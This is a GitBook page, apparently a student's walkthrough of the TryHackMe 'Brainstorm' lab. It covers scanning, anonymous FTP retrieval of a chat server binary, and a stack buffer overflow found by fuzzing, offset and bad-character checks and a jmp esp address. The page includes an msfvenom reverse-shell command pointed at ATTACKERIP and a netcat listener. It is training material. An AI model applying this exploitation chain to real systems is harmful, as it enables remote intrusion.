
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>Brainstorm Â· GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="gatekeeper.html" />
    
    
    <link rel="prev" href="buffer-overflow-prep.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    Offensive Path - TryHackMe
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../getting-started/">
            
                <a href="../getting-started/">
            
                    
                    Getting Started
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" data-path="../getting-started/tutorial.html">
            
                <a href="../getting-started/tutorial.html">
            
                    
                    Tutorial
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2" data-path="../getting-started/vulnversity.html">
            
                <a href="../getting-started/vulnversity.html">
            
                    
                    Vulnversity
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.3" data-path="../getting-started/blue.html">
            
                <a href="../getting-started/blue.html">
            
                    
                    Blue
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4" data-path="../getting-started/kenobi.html">
            
                <a href="../getting-started/kenobi.html">
            
                    
                    Kenobi
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="../advanced-exploitation/">
            
                <a href="../advanced-exploitation/">
            
                    
                    Advanced Exploitation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="../advanced-exploitation/steel-mountain.html">
            
                <a href="../advanced-exploitation/steel-mountain.html">
            
                    
                    Steel Mountain
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.2" data-path="../advanced-exploitation/alfred.html">
            
                <a href="../advanced-exploitation/alfred.html">
            
                    
                    Alfred
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.3" data-path="../advanced-exploitation/hackpark.html">
            
                <a href="../advanced-exploitation/hackpark.html">
            
                    
                    HackPark
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.4" data-path="../advanced-exploitation/game-zone.html">
            
                <a href="../advanced-exploitation/game-zone.html">
            
                    
                    Game Zone
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.5" data-path="../advanced-exploitation/skynet.html">
            
                <a href="../advanced-exploitation/skynet.html">
            
                    
                    Skynet
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.6" data-path="../advanced-exploitation/daily-bugle.html">
            
                <a href="../advanced-exploitation/daily-bugle.html">
            
                    
                    Daily Bugle
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.7" data-path="../advanced-exploitation/overpass-2-hacked.html">
            
                <a href="../advanced-exploitation/overpass-2-hacked.html">
            
                    
                    Overpass 2 - Hacked
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.8" data-path="../advanced-exploitation/relevant.html">
            
                <a href="../advanced-exploitation/relevant.html">
            
                    
                    Relevant
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.9" data-path="../advanced-exploitation/internal.html">
            
                <a href="../advanced-exploitation/internal.html">
            
                    
                    Internal
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="../active-directory/">
            
                <a href="../active-directory/">
            
                    
                    Active Directory
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="../active-directory/active-directory-basics.html">
            
                <a href="../active-directory/active-directory-basics.html">
            
                    
                    Active Directory Basics
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="./">
            
                <a href="./">
            
                    
                    Binary Overflow Exploitation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1" data-path="buffer-overflow-prep.html">
            
                <a href="buffer-overflow-prep.html">
            
                    
                    Buffer Overflow Prep
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.5.2" data-path="brainstorm.html">
            
                <a href="brainstorm.html">
            
                    
                    Brainstorm
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3" data-path="gatekeeper.html">
            
                <a href="gatekeeper.html">
            
                    
                    Gatekeeper
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >Brainstorm</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="brainstorm">Brainstorm</h1>
<h3 id="tasks">Tasks:</h3>
<ol>
<li><strong>Deploy Machine and Scan Network</strong>:<ol>
<li>Scan with nmap as usual : <code>nmap -sC -sV -T5 ip</code></li>
</ol>
</li>
<li><p><strong>Accessing Files</strong>:</p>
<ol>
<li>From nmap scan , ftp port open at 22, connect using <code>ftp ip</code> and anonymous:anonymous as credentials. <code>cd chatserver</code>, <code>bin</code>, <code>mget *</code> and <code>quit</code>. - chatserver.exe and essfunc.dll downloaded.</li>
<li><code>nc ip 9999</code> - some chatserver is running, it might be the chatserver.exe we just downloaded through FTP.</li>
</ol>
</li>
</ol>
<ol>
<li><strong>Access</strong>:<ol>
<li>Transfer both <a href="https://transfer.sh/PA1HHq/chatserver.exe" target="_blank">exe</a> and <a href="https://transfer.sh/6tX6aS/essfunc.dll" target="_blank">dll</a> to windows machine.</li>
<li>Executing exe, it takes 2 input (username and message) , username limits to 20 character, we can safely assume that message is where the bufferoverflow might be.</li>
<li>Start debugging the chatserver with Immunity Debugger.</li>
<li>Each time you are running python script, you will need to restart program in Immunity debugger.</li>
<li>Use <a href="https://gist.github.com/jayateertha043/e11a338d2a0683ddd49ae01373d655f3" target="_blank">fuzz.py</a> to determine length of buffer when program crashes ~ 2100</li>
<li>Generate cyclic string using <a href="https://wiremask.eu/tools/buffer-overflow-pattern-generator/" target="_blank">online tool</a> or using metasploit framework pattern_<em>create.rb and use the cyclic string as buffer in </em><a href="https://gist.github.com/jayateertha043/0a3651e5d79e0323c174a4ae2d9b9309" target="_blank"><em>offset_finder.py</em></a>_ _and run offset_finder.py after restarting chatserver in immunity debugger, when the program crashes  note down the value of EIP register and enter the value in the <a href="https://wiremask.eu/tools/buffer-overflow-pattern-generator/" target="_blank">online tool</a> or pattern_offset.rb. You will get the resultant exact offset value where the buffer was overflowed - 2012.</li>
<li>Run <a href="https://gist.github.com/jayateertha043/51a8e5ff9984e85f80fcfdb36572bea9" target="_blank">bad_char.py</a> , again when program crashes look for missing bad characters if any by following ESP stack dump. If any of them is missing or not in order, try removing them from bad_char.py and repeat till all the bad characters are in same order as sent. - In this case only bad character was \x00 - null character.</li>
<li>Run <code>!mona modules</code> in Immunity debugger to find dll and exe running without any additional security protections such as ASLR and DEP - chatserver.exe and essfunc.dll</li>
<li>Run <code>!mona find -s &quot;\xff\xe4&quot; -m essfunc.dll</code> to find address of jmp esp instruction inside essfunc.dll, there will be multiple such address you can pick any of them (make sure there are no bad chars at this address) - 625014DF</li>
<li>Convert the address obtained to little endian format  - &quot;\xdf\x14\x50\x62&quot; and we can use this as value of eip when we later use exploit.py.</li>
<li>Generate msfvenom payload - <code>msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKERIP LPORT=4444 -b &apos;\x00&apos; -f py</code> and copy the payload replace it in <a href="https://gist.github.com/jayateertha043/5cb8f71cf3e2067d81cf201973420483" target="_blank">exploit.py</a>.</li>
<li>Start netcat listener - <code>nc -nlvp 4444</code></li>
<li>Run <code>python exploit.py</code> to get shell in netcat.</li>
<li><code>cd C:\Users\drake\\Desktop</code> and <code>type root.txt</code> to get flag and submit !!!</li>
</ol>
</li>
</ol>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="buffer-overflow-prep.html" class="navigation navigation-prev " aria-label="Previous page: Buffer Overflow Prep">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="gatekeeper.html" class="navigation navigation-next " aria-label="Next page: Gatekeeper">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Brainstorm","level":"1.5.2","depth":2,"next":{"title":"Gatekeeper","level":"1.5.3","depth":2,"path":"binary-overflow-exploitation/gatekeeper.md","ref":"binary-overflow-exploitation/gatekeeper.md","articles":[]},"previous":{"title":"Buffer Overflow Prep","level":"1.5.1","depth":2,"path":"binary-overflow-exploitation/buffer-overflow-prep.md","ref":"binary-overflow-exploitation/buffer-overflow-prep.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"binary-overflow-exploitation/brainstorm.md","mtime":"2021-11-27T14:47:08.894Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-11-27T14:47:33.497Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

